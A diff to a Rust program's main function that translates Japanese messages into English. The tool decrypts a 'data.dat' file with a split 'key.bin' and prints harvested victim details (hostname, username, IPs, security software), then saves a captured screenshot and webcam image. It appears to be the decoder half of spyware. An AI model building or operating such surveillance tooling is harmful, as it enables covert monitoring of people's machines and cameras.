@@ -5,65 +5,65 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args: Vec<String> = env::args().collect();
     
     if args.len() < 2 {
-        eprintln!("使用法: {} <data.dat> [key.bin]", args[0]);
-        eprintln!("例:");
-        eprintln!("  {} data.dat              # key.binを自動検索", args[0]);
-        eprintln!("  {} data.dat my_key.bin   # 指定されたキーファイルを使用", args[0]);
+        eprintln!("Usage: {} <data.dat> [key.bin]", args[0]);
+        eprintln!("Examples:");
+        eprintln!("  {} data.dat              # search for key.bin automatically", args[0]);
+        eprintln!("  {} data.dat my_key.bin   # use the specified key file", args[0]);
         return Ok(());
     }
 
     let data_file = &args[1];
     let key_file = args.get(2).map(|s| s.as_str());
 
-    println!("復号化中: {}", data_file);
+    println!("Decrypting: {}", data_file);
     if let Some(key) = key_file {
-        println!("キーファイル: {}", key);
+        println!("Key file: {}", key);
     }
 
-    // データを復号化
+    // Decrypt the data
     match decrypt_data_file(data_file, key_file) {
         Ok((system_info, image_data)) => {
-            println!("\n=== システム情報 ===");
-            println!("ホスト名: {}", system_info.hostname);
+            println!("\n=== System information ===");
+            println!("Hostname: {}", system_info.hostname);
             println!("OS: {} {}", system_info.os_name, system_info.os_version);
-            println!("ユーザー名: {}", system_info.username);
-            println!("プロセッサ: {}", system_info.processor);
-            println!("CPUコア数: {}", system_info.cores);
-            println!("ローカルIP: {}", system_info.local_ip);
-            println!("グローバルIP: {}", system_info.global_ip);
-            println!("国コード: {}", system_info.country_code);
+            println!("Username: {}", system_info.username);
+            println!("Processor: {}", system_info.processor);
+            println!("CPU cores: {}", system_info.cores);
+            println!("Local IP: {}", system_info.local_ip);
+            println!("Global IP: {}", system_info.global_ip);
+            println!("Country code: {}", system_info.country_code);
             
             if !system_info.security_software.is_empty() {
-                println!("セキュリティソフト: {:?}", system_info.security_software);
+                println!("Security software: {:?}", system_info.security_software);
             }
 
-            // 画像保存
+            // Save images
             if !image_data.screenshot.is_empty() {
                 match save_screenshot(&image_data.screenshot, "screenshot.png") {
-                    Ok(_) => println!("\nスクリーンショットを保存: screenshot.png"),
-                    Err(e) => eprintln!("スクリーンショット保存エラー: {}", e),
+                    Ok(_) => println!("\nSaved screenshot: screenshot.png"),
+                    Err(e) => eprintln!("Failed to save screenshot: {}", e),
                 }
             } else {
-                println!("\nスクリーンショット: なし");
+                println!("\nScreenshot: none");
             }
 
             if !image_data.webcam_image.is_empty() {
                 match save_webcam_image(&image_data.webcam_image, "webcam.png") {
-                    Ok(_) => println!("Webカメラ画像を保存: webcam.png"),
-                    Err(e) => eprintln!("Webカメラ画像保存エラー: {}", e),
+                    Ok(_) => println!("Saved webcam image: webcam.png"),
+                    Err(e) => eprintln!("Failed to save webcam image: {}", e),
                 }
             } else {
-                println!("Webカメラ画像: なし");
+                println!("Webcam image: none");
             }
         }
         Err(e) => {
-            eprintln!("復号化エラー: {}", e);
-            eprintln!("\n新形式専用の復号化ツールです。以下を確認してください:");
-            eprintln!("- data.datファイルが新形式（キー分離型）で作成されているか");
-            eprintln!("- key.binファイルが同じディレクトリに存在するか");
-            eprintln!("- キーファイルとデータファイルが対応しているか");
-            eprintln!("- ファイルが破損していないか");
-            eprintln!("\n注意: 旧形式（キー埋め込み型）のファイルはサポートされません。");
+            eprintln!("Decryption error: {}", e);
+            eprintln!("\nThis tool only supports the new split-key format. Please check the following:");
+            eprintln!("- Ensure data.dat was created using the new split-key format");
+            eprintln!("- Verify key.bin exists in the same directory");
+            eprintln!("- Confirm the key file matches the data file");
+            eprintln!("- Check that the files are not corrupted");
+            eprintln!("\nNote: legacy embedded-key files are not supported.");
         }
     }
 
